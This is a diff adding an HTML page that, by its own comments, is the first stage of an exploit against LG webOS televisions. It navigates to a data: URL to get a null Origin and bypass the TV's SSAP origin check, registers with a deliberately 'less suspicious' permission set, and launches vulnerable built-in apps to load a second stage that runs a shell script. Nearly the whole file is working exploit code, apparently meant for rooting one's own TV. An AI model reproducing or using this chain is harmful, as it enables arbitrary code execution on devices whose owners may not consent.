@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Return the Beanbird Cursor</title>
+    <style>
+        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .button { padding: 20px 40px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; font-weight: bold; transition: 0.2s; }
+        #btn-run { background: #ff0066; border: 2px solid #ff9900; }
+        #btn-reset { background: #444; color: #ccc; }
+        .button:focus { outline: 4px solid #fff; transform: scale(1.05); }
+        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; border: 1px solid #333; overflow-y: auto; }
+        .note { border: 1px solid #ffcc00; color: #ffcc00; padding: 10px; display: inline-block; margin: 10px; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>Return the Beanbird Cursor</h1>
+    <p>Press the button below and <b>Accept the prompt on your TV screen.</b></p>
+    
+    <button id="btn-run" class="button">Return Beanbird Cursor</button>
+    <button id="btn-reset" class="button">Reset to Default</button>
+    <br>
+    <div class="note">Note: TV will be blackscreen for 10-20 seconds during the process.</div>
+    
+    <div id="log">Status: Ready.</div>
+
+    <script>
+        // --- Capture the full base URL (including subdirectory path) before data: navigation ---
+        // window.location.origin alone gives https://itsrealm12c.github.io — missing /rbc/.
+        // We need the full folder path so stage2.html and script URLs resolve correctly.
+        window.ORIGIN_URL =
+            window.location.protocol === 'data:' ? '__ORIGIN__' :
+            window.location.protocol === 'file:' ? 'http://127.0.0.1' :
+            window.location.href.replace(/\/[^\/]*$/, ''); // strips filename, keeps folder path
+
+        // --- Navigate self to data: URL so WebSocket sends Origin: null ---
+        // SSAP on webOS 4.x blocks http/https origins but allows null (data: origin).
+        // btoa() crashes on non-Latin1 chars on older webOS Chromium — use the
+        // unescape+encodeURIComponent trick to safely encode any unicode in the page HTML.
+        try {
+            if (window.location.protocol !== 'data:') {
+                var html = document.documentElement.innerHTML
+                    .replace('__ORIGIN__', window.ORIGIN_URL);
+                // Safe btoa for unicode: percent-encode then collapse back to bytes
+                var b64 = btoa(unescape(encodeURIComponent(html)));
+                window.location = 'data:text/html;base64,' + b64;
+                // Execution stops here — page reloads as data: URL
+            }
+        } catch(e) {}
+    </script>
+    <script>
+        var logBox = document.querySelector('#log');
+        function log(str) { logBox.innerText += '> ' + str + '\n'; logBox.scrollTop = logBox.scrollHeight; }
+
+        // --- ProxyWebSocket ---
+        // Opens the real WebSocket inside a data: iframe so Origin: null is sent.
+        // Direct new WebSocket() from an http: page sends Origin: http://... which
+        // SSAP on webOS 4.x rejects silently — that was the core bug.
+        function ProxyWebSocket(target) {
+            function proxyPayload(address) {
+                function forward(type, data) {
+                    window.parent.postMessage(JSON.stringify({ type: type, data: data }), '*');
+                }
+                try {
+                    var conn = new WebSocket(address);
+                    conn.onopen    = function(e) { forward('open', e); };
+                    conn.onclose   = function(e) { forward('close', e); };
+                    conn.onerror   = function(e) { forward('error', e); };
+                    conn.onmessage = function(e) { forward('message', { data: e.data }); };
+                    window.addEventListener('message', function(ev) {
+                        var msg = JSON.parse(ev.data);
+                        if (msg.type === 'send') conn.send(msg.data);
+                    }, false);
+                } catch(err) { forward('error', err); }
+            }
+
+            var self = this;
+            this.proxy = document.createElement('iframe');
+            this.proxy.style.display = 'none';
+            this.proxy.setAttribute('src',
+                'data:text/html;base64,' + btoa(
+                    '<script>' + proxyPayload.toString() +
+                    ';proxyPayload(' + JSON.stringify(target) + ');<\/script>'
+                )
+            );
+            window.addEventListener('message', function(ev) {
+                if (ev.source !== self.proxy.contentWindow) return;
+                var msg = JSON.parse(ev.data);
+                if (msg.type === 'message' && self.onmessage) self.onmessage(msg.data);
+                if (msg.type === 'open'    && self.onopen)    self.onopen(msg.data);
+                if (msg.type === 'close'   && self.onclose)   self.onclose(msg.data);
+                if (msg.type === 'error'   && self.onerror)   self.onerror(msg.data);
+            }, false);
+            document.body.appendChild(this.proxy);
+        }
+        ProxyWebSocket.prototype.send = function(data) {
+            this.proxy.contentWindow.postMessage(JSON.stringify({ type: 'send', data: data }), '*');
+        };
+        ProxyWebSocket.prototype.close = function() {
+            if (this.proxy.parentNode) this.proxy.parentNode.removeChild(this.proxy);
+        };
+
+        // --- Main exploit ---
+        var activeConn = null;
+
+        function startExploit(scriptName) {
+            if (activeConn) { try { activeConn.close(); } catch(e) {} }
+
+            // Build stage2 URL using the captured HTTP origin (ORIGIN_URL),
+            // because window.location is now data: and has no useful origin.
+            // Pass script name as hash fragment, NOT ?run= query param.
+            // facebooklogin rewrites/drops query strings when loading the server URL,
+            // but # fragment is never sent to the server so it survives intact.
+            var stage2Url = window.ORIGIN_URL + '/stage2.html#' + encodeURIComponent(scriptName);
+
+            log('Connecting via proxy iframe (Origin: null)...');
+            var conn = new ProxyWebSocket('ws://127.0.0.1:3000');
+            activeConn = conn;
+
+            conn.onerror = function() {
+                log('ERROR: Could not connect. Check LG Connect Apps is enabled on the TV.');
+            };
+            conn.onclose = function() { log('Connection closed.'); };
+
+            conn.onopen = function() {
+                log('Connected. >>> ACCEPT THE PROMPT ON YOUR TV <<<');
+                conn.send(JSON.stringify({
+                    id: 'reg_0',
+                    type: 'register',
+                    payload: {
+                        forcePairing: false,
+                        pairingType: 'PROMPT',
+                        manifest: {
+                            manifestVersion: 1,
+                            localizedAppNames: { '': 'Beanbird Cursor' },
+                            // Minimal set — less suspicious, still enough to listApps + launch
+                            permissions: ['LAUNCH', 'READ_INSTALLED_APPS']
+                        }
+                    }
+                }));
+            };
+
+            // Pending request callbacks keyed by message id
+            var pending = {};
+            function request(uri, payload, cb) {
+                var id = 'req_' + Date.now();
+                pending[id] = cb;
+                conn.send(JSON.stringify({ id: id, type: 'request', uri: uri, payload: payload }));
+            }
+
+            conn.onmessage = function(evt) {
+                var msg;
+                try { msg = JSON.parse(evt.data); } catch(e) { log('Parse error: ' + evt.data); return; }
+
+                if (msg.type === 'registered') {
+                    log('Registered! Scanning for escape app...');
+
+                    // Query installed apps and pick best available escape hatch —
+                    // same priority logic as RootMyTV so we work even if facebooklogin is absent.
+                    request('ssap://com.webos.applicationManager/listApps', {}, function(res) {
+                        var candidates = {
+                            'com.webos.app.facebooklogin': {
+                                priority: 1000,
+                                params: function(u) { return { server: u.replace(/^https?:\/\//, '') + '#' }; }
+                            },
+                            'com.webos.app.alibaba': {
+                                priority: 800,
+                                params: function(u) { return { target: u }; }
+                            },
+                            'com.webos.app.acrcard': {
+                                priority: 600,
+                                params: function(u) { return { contentTarget: u }; }
+                            }
+                        };
+
+                        var best = null;
+                        (res.payload.apps || []).forEach(function(app) {
+                            if (app.id in candidates) {
+                                log('Found escape app: ' + app.id);
+                                if (!best || candidates[app.id].priority > candidates[best].priority) {
+                                    best = app.id;
+                                }
+                            }
+                        });
+
+                        if (!best) {
+                            log('ERROR: No escape app found (facebooklogin/alibaba/acrcard). TV may be patched.');
+                            return;
+                        }
+
+                        log('Launching ' + best + ' -> ' + stage2Url);
+                        request('ssap://system.launcher/launch', {
+                            id: best,
+                            params: candidates[best].params(stage2Url)
+                        }, function(res2) {
+                            log('Launch result: ' + JSON.stringify(res2.payload));
+                        });
+                    });
+
+                } else if (msg.type === 'response') {
+                    if (pending[msg.id]) {
+                        pending[msg.id](msg);
+                        delete pending[msg.id];
+                    }
+                    // else: intermediate register response — just wait
+
+                } else if (msg.type === 'error') {
+                    log('Error (prompt declined?): ' + evt.data);
+                    if (pending[msg.id]) {
+                        pending[msg.id](msg);
+                        delete pending[msg.id];
+                    }
+                }
+            };
+        }
+
+        // Use .txt extension so any HTTP server serves the file without MIME blocking.
+        // Stage2 saves it locally as .sh before executing.
+        document.querySelector('#btn-run').onclick    = function() { startExploit('beanbird.txt'); };
+        document.querySelector('#btn-reset').onclick  = function() { startExploit('reboot.txt'); };
+    </script>
+</body>
+</html>
